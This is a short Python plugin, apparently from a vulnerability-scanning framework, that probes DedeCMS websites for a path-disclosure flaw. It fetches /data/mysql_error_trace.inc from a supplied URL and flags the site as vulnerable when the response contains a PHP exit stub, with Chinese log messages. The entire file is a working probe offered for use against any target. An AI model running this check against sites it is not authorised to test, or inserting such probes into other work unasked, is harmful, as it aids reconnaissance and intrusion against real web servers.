#!/usr/bin/env python
# -*- coding: utf-8 -*-

from script.lib import logger
from script.lib import requests

author = "SpongeB0B"
scope = "dedecms trace爆路径漏洞"
description = "/data/mysql_error_trace.inc mysql trace报错路径泄露"
reference = "http://0daysec.blog.51cto.com/9327043/1571372"

options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]
def exploit(url):
	headers = {
		"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
	}
	payload = "/data/mysql_error_trace.inc"
	vulnurl = url + payload
	try:
		req = requests.get(vulnurl, headers=headers, timeout=10)
		req.close()
		if r"<?php  exit()" in req.content:
			logger.success("[+]存在dedecms trace爆路径漏洞...(信息)\tpayload: "+vulnurl)
			return vulnurl

	except:
		logger.error("[-] "+vulnurl+"====>连接超时")
		pass
